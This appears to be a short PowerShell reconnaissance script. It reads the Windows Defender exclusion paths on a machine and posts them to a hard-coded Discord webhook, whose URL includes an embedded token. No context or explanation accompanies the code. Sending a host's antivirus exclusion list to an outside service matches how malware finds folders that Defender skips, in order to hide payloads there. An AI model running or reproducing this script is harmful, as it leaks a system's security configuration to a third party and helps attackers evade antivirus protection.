$hookUrl = "https://discord.com/api/webhooks/1065355278549262357/ZgGNOcyL2A6px5BB6yCck8MjYwkHcYpGhryXLis_epP_2cGNAFHGmApGuyOO1kMXy-wJ"
$exclusionCheck = If (((Get-MpPreference).ExclusionPath) -eq $null) {Write-Output "No exclusion found"} Else {(Get-MpPreference).ExclusionPath}
$content = @"
Windows Defender Exclusion Check:

$exclusionCheck

"@

$payload = [PSCustomObject]@{
    content = $content
}

Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json)